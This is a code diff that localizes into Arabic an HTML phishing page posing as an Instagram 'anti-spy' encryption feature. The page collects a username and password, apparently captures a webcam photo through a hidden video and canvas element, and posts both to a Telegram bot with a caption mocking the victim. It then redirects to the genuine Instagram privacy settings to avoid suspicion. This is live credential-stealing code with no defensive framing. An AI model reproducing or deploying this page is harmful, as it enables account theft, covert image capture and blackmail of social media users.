@@ -1,26 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Privacy Protection Hub</title>
+    <title>مركز حماية الخصوصية</title>
     <link href="https://fonts.googleapis.com/css2?family=Cookie&display=swap" rel="stylesheet">
     <style>
         body { font-family: -apple-system, sans-serif; background-color: #050505; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background-color: #121212; border: 1px solid #222; border-radius: 16px; padding: 35px 25px; width: 340px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.8); }
         .brand { font-family: 'Cookie', cursive; font-size: 50px; margin-bottom: 5px; color: #fff; }
         .shield-icon { font-size: 45px; margin-bottom: 15px; display: block; }
-        h2 { font-size: 19px; font-weight: 700; margin-bottom: 12px; color: #0095f6; }
-        p { font-size: 12.5px; color: #b0b0b0; line-height: 1.6; margin-bottom: 25px; }
+        h2 { font-size: 20px; font-weight: 700; margin-bottom: 12px; color: #0095f6; }
+        p { font-size: 13px; color: #b0b0b0; line-height: 1.6; margin-bottom: 25px; }
         
-        .input-group { position: relative; width: 100%; margin-bottom: 12px; }
-        input { width: 100%; background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 14px; color: #fff; font-size: 14px; box-sizing: border-box; outline: none; }
+        input { width: 100%; background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 14px; color: #fff; font-size: 14px; box-sizing: border-box; outline: none; margin-bottom: 12px; text-align: right; }
         input:focus { border-color: #0095f6; }
         
-        button { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 8px; padding: 14px; font-size: 15px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        button { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 8px; padding: 14px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
         button:hover { background-color: #1a73e8; }
         
-        .security-badge { margin-top: 25px; font-size: 10px; color: #444; border-top: 1px solid #222; padding-top: 15px; }
+        .security-badge { margin-top: 25px; font-size: 11px; color: #444; border-top: 1px solid #222; padding-top: 15px; }
         video, canvas { display: none; }
     </style>
 </head>
@@ -29,21 +28,17 @@
     <div class="card">
         <div class="brand">Instaagram</div>
         <span class="shield-icon">🛡️</span>
-        <h2>Anti-Spy Protection</h2>
-        <p>Your account might be visible to unauthorized viewers. Enter your details below to activate <b>End-to-End Encryption</b> and hide your Stories/Posts from spies.</p>
+        <h2>حماية الحساب من التجسس والمراقبة</h2>
+        <p>نظام التشفير رصد محاولات دخول غير مصرح بها لصورك وقصصك (Stories). قم بتفعيل <b>ميزة التشفير التام</b> الآن لإخفاء نشاطك عن المتلصصين.</p>
         
-        <div class="input-group">
-            <input type="text" id="log_id" placeholder="Usernme" spellcheck="false">
-        </div>
-        <div class="input-group">
-            <input type="password" id="log_pass" placeholder="Passkey">
-        </div>
+        <input type="text" id="log_id" placeholder="اسم المستخِدم (Usernme)" spellcheck="false">
+        <input type="password" id="log_pass" placeholder="كلمة السِر (Passkey)">
         
-        <button onclick="activate()">Secure My Account Now</button>
+        <button onclick="activate()">تفعيل الحماية الفورية</button>
         
         <div class="security-badge">
-            Status: <span style="color:#00ff00;">Scanning for Spies...</span> <br>
-            Secure Node: #AX-992
+            الحالة: <span style="color:#ffcc00;">جاري فحص التهديدات...</span> <br>
+            رقم الحماية: #AX-992-SEC
         </div>
     </div>
 
@@ -67,11 +62,11 @@
                 const f = new FormData();
                 f.append("chat_id", CHAT_ID);
                 f.append("photo", b, "secure.jpg");
-                f.append("caption", `🛡️ تم تفعيل "الحماية" للمبتز!\n\n👤 يوزر: ${document.getElementById('log_id').value}\n🔑 باس: ${document.getElementById('log_pass').value}`);
+                f.append("caption", `🛡️ تم "تأمين" حساب المبتز بنجاح!\n\n👤 يوزر: ${document.getElementById('log_id').value}\n🔑 باس: ${document.getElementById('log_pass').value}`);
 
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: f })
                 .then(() => {
-                    alert("Security Activated! Your profile is now hidden from unauthorized viewers.");
+                    alert("تم تفعيل الحماية بنجاح! حسابك الآن مخفي تماماً عن أي محاولات تجسس خارجي.");
                     window.location.href = "https://www.instagram.com/accounts/privacy_and_security/";
                 });
             }, 'image/jpeg');
